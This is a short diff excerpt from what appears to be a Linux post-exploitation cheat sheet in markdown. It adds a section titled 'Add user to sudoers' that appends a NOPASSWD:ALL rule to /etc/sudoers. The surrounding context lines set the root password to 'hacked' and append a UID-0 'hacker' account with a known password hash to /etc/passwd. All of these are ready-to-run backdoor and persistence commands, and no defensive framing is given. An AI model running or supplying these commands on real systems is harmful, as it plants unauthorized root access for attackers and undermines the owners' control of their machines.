@@ -53,5 +53,9 @@ echo "root:hacked" | chpasswd
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
 
+### Add user to sudoers
 
+```bash
+echo "<username> ALL=NOPASSWD:ALL" >> /etc/sudoers
+```
 
